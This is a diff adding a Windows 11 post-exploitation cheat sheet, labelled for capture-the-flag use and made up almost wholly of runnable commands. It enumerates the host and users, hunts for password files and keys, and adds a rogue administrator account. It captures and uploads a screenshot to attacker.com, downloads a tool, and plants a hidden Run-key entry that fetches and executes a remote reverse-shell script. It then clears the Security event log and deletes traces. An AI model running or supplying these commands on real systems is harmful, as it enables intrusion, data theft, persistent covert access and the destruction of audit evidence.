@@ -1,1 +1,62 @@
+========================================
+🎯 CTF Post-Exploitation Cheat Sheet
+Target: Windows 11
+========================================
 
+📌 SYSTEM INFO (PowerShell Core Available)
+whoami
+hostname
+systeminfo
+$env:COMPUTERNAME
+$PSVersionTable
+Get-CimInstance Win32_OperatingSystem
+Get-CimInstance Win32_ComputerSystem
+
+📌 USER ENUM / PRIVS
+net users
+net localgroup administrators
+whoami /groups
+whoami /priv
+Get-LocalUser | Format-List
+
+📌 NETWORK ENUM
+ipconfig /all
+Get-NetAdapter
+Get-NetIPAddress
+netstat -ano
+route print
+
+📌 SERVICES / TASKS
+Get-Service | Where-Object {$_.Status -eq "Running"}
+schtasks /query /fo LIST /v
+Get-ScheduledTask | Where-Object {$_.TaskPath -ne "\"} | Select TaskName, State
+
+📌 PROGRAMS
+Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*
+Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*
+
+📌 FILE HUNTING
+Get-ChildItem C:\Users -Recurse -Include *password*,*.pfx,*.kdbx,*.pem,*.config -ErrorAction SilentlyContinue
+
+📌 PRIVESC ATTEMPT
+net user sysadmin P@ssword2025 /add
+net localgroup administrators sysadmin /add
+
+📌 SCREENSHOT (Modern GUI)
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$bmp = New-Object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
+$g = [System.Drawing.Graphics]::FromImage($bmp)
+$g.CopyFromScreen(0,0,0,0,$bmp.Size)
+$bmp.Save("C:\Users\Public\screenshot_win11.jpg")
+
+📌 DOWNLOAD / UPLOAD
+Invoke-WebRequest http://attacker.com/tool.exe -OutFile C:\Users\Public\tool.exe
+Invoke-WebRequest http://attacker.com/upload -Method POST -InFile C:\Users\Public\screenshot_win11.jpg
+
+📌 PERSISTENCE METHOD
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d "powershell -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/psrev.ps1')" /f
+
+📌 CLEAR LOGS
+wevtutil cl Security
+Remove-Item -Path C:\Users\Public\*.jpg -Force
